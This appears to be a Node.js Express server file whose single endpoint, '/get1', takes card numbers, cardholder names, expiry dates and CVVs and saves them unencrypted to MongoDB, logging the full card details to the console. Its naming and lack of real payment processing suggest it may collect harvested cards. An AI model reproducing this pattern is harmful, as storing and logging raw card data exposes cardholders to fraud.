const express = require("express");
const mongoose = require("mongoose");
const Log = require("./Py"); 

const app = express();
app.use(express.json());

const url = "mongodb://localhost:27017/";  

mongoose.connect(url, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("✅ Database connected"))
    .catch((error) => console.error("❌ Database connection error:", error));

app.post("/get1", async (req, res) => {
    try {
        const { cardNumber, cardHolder, expiryDate, cvv } = req.body;

        if (!cardNumber || !cardHolder || !expiryDate || !cvv) {
            return res.status(400).json({ success: false, message: "Missing required fields" });
        }

        const payment = new Log({ cardNumber, cardHolder, expiryDate, cvv });
        await payment.save();

        console.log("✅ Payment details saved:", req.body);
        res.status(201).json({ success: true, message: "Payment saved successfully" });

    } catch (error) {
        console.error("❌ Error processing payment:", error);
        res.status(500).json({ success: false, message: "Internal server error" });
    }
});

app.listen(9000, () => {
    console.log("🚀 Server running on port 9000");
});
